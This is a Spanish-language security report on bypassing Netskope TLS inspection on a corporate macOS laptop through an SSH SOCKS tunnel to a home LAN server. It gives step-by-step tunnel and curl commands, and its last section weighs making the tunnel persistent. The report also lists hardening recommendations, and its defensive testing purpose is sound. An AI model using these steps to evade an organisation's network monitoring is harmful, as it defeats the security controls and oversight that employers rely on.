# Análisis: evasión de inspección TLS de Netskope en macOS vía túnel SSH

**Fecha**: 2026-08-25 · **Alcance**: mact2 (macOS 26.6.2, Intel) · **Resultado**: bypass confirmado con evidencia forense — un túnel SSH hacia un host de la LAN evade al 100% la inspección TLS de Netskope, sin herramientas especializadas.

## TL;DR

- Netskope intercepta y re-firma todo el TLS saliente de mact2 (MITM con CA corporativa).
- Un único comando (`ssh -D`) hacia otro equipo de la red interna hace el tráfico invisible para Netskope: solo ve TCP cifrado a `172.16.0.5:22`.
- El control actual además **rompe clientes CLI legítimos** (curl rechaza el certificado falsificado), lo que incentiva a los usuarios a buscar este tipo de workarounds.
- Conclusión: sin controles de endpoint complementarios, la protección de red es trivialmente evadible en los Mac.

## Contexto del entorno observado

| Componente | Detalle |
|------------|---------|
| Endpoint probado | `mact2` — macOS 26.6.2, Intel, usuario `jcuzmar`, LAN `172.16.0.9` |
| Host de salida | `rog` — NixOS home server, LAN `172.16.0.5` (mismo NAT → misma IP pública) |
| Netskope activo | `NetskopeClientMacAppProxy` (system extension = interceptación a nivel kernel), `Netskope Endpoint DLP` (EPDLP), `nsAuxiliarySvc` |
| Modo de red | Sin proxy explícito (`scutil --proxy` vacío, `BypassAllowed: 0`) → interceptación transparente |
| CA de MITM detectada | `CN=ca.grupofalabella.goskope.com` · `emailAddress=certadmin@netskope.com` |

## Evidencia

### Prueba 1 — Certificado TLS (la demostradora)

Mismo destino (`api.openai.com:443`), dos caminos:

| Camino | Issuer del certificado | Lectura |
|--------|------------------------|---------|
| Directo | `C=CL, O=Falabella, CN=ca.grupofalabella.goskope.com, email=certadmin@netskope.com` | Netskope re-firma el tráfico → MITM activo |
| Por túnel SSH | `C=US, O=Google Trust Services, CN=WE1` | Certificado real de OpenAI → TLS íntegro, inspección evadida |

```bash
# Directo (interceptado)
echo | openssl s_client -connect api.openai.com:443 -servername api.openai.com \
  | openssl x509 -noout -issuer

# Por túnel (puerto local reenviado dentro del SSH, TLS end-to-end con OpenAI)
echo | openssl s_client -connect 127.0.0.1:8443 -servername api.openai.com \
  | openssl x509 -noout -issuer
```

### Prueba 2 — HTTP contra api.openai.com

| Camino | Resultado |
|--------|-----------|
| Directo | ❌ `curl: (60) SSL certificate problem: self-signed certificate in certificate chain` → status `000`. El MITM **rompe** clientes CLI que no confían en la CA corporativa. |
| Por túnel SOCKS5 | ✅ `401 Unauthorized` en 0.22 s → llegó al API real (401 = falta API key, respuesta esperada). |

### Prueba 3 — IP de salida

Ambos caminos muestran `201.188.187.112`: mact2 y rog comparten NAT, por lo que esta prueba no discrimina en esta LAN. La evidencia discriminante son las pruebas 1 y 2. En un escenario real (salida por VPN/residencial distinta), la IP pública también cambiaría.

## Qué ve y qué no ve Netskope durante el túnel

| Señal | ¿Visible? |
|-------|-----------|
| Destino final (api.openai.com, SNI, IP destino real) | ❌ No — viaja cifrado dentro del SSH |
| DNS del dominio visitado | ❌ No — `socks5h` resuelve en rog |
| Contenido / tokens del tráfico | ❌ No — cifrado extremo a extremo |
| Conexión TCP a `172.16.0.5:22` prolongada | ✅ Sí (metadatos de flujo) |
| Proceso `ssh -D ...` corriendo en el endpoint | ⚠️ Posible — EPDLP opera a nivel proceso/archivo |

**Limitación honesta**: este bypass ciega la capa *red*. El módulo Endpoint DLP puede seguir registrando telemetría local del proceso `ssh`. Eso no invalida el hallazgo — lo refuerza: hoy ningún control de ese tipo está configurado para alertar sobre esto.

## Metodología de reproducción

```bash
# 1. Túnel desde mact2 (SOCKS5 dinámico + forward dedicado para forense TLS)
ssh -f -N -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes \
    -S /tmp/rog-tunnel.ctl \
    -D 127.0.0.1:1080 \
    -L 127.0.0.1:8443:api.openai.com:443 \
    -i ~/.ssh/glats-rog glats@<ip-de-rog>

# 2. Validar egress por el túnel
curl --proxy socks5h://127.0.0.1:1080 https://ifconfig.me

# 3. Validar destino sensible por el túnel
curl --proxy socks5h://127.0.0.1:1080 https://api.openai.com/v1/models   # 401 esperado

# 4. Cerrar
ssh -S /tmp/rog-tunnel.ctl -O exit glats@<ip-de-rog>
```

Tiempo total de preparación del ataque: **< 10 minutos**, usando solo OpenSSH (preinstalado en macOS) y una llave SSH ya autorizada. El host de salida no requirió instalación de software adicional: `sshd` ya provee el proxy SOCKS dinámico.

## Recomendaciones de endurecimiento (priorizadas)

| # | Control | Qué bloquea | Esfuerzo |
|---|---------|-------------|----------|
| 1 | **Restringir SSH saliente** desde endpoints gestionados (firewall/profile: solo a gateways aprobados) | El vector completo de este PoC | Bajo |
| 2 | **Alertas EPDLP**: procesos `ssh` con forwarding (`-D/-L/-R`), listeners locales nuevos (p. ej. :1080/:8443), sesiones SSH salientes long-lived | Persistencia del túnel y variantes | Medio |
| 3 | **Quitar admin local** al usuario (MDM) — impide cambios en `networksetup` y instalación de relays | Tunnels basados en config de sistema y binarios ad-hoc | Medio |
| 4 | **Netskope forced-tunnel + kill-switch** cubriendo también tráfico LAN | Túneles intra-LAN como el probado | Config vendor |
| 5 | Revisar política de llaves SSH autorizadas entre equipos internos (este PoC usó una llave preexistente) | Reúso de credenciales internas como pivote | Bajo |

La recomendación #1 sola habría detenido este PoC en el primer paso. Las #2–#4 cierran variantes (otros protocolos de túnel: QUIC, WebRTC, DoH).

## Próximos pasos sugeridos

- [ ] Correlacionar timestamps de esta prueba con la consola de Netskope (confirmar ceguera del lado consola).
- [ ] Decidir persistencia del laboratorio: LaunchAgent con autossh gestionado por nix-darwin, o dejarlo manual.
- [ ] Evaluar daemon SOCKS5 dedicado en rog si se requiere salida estable multi-host (módulo NixOS nuevo).
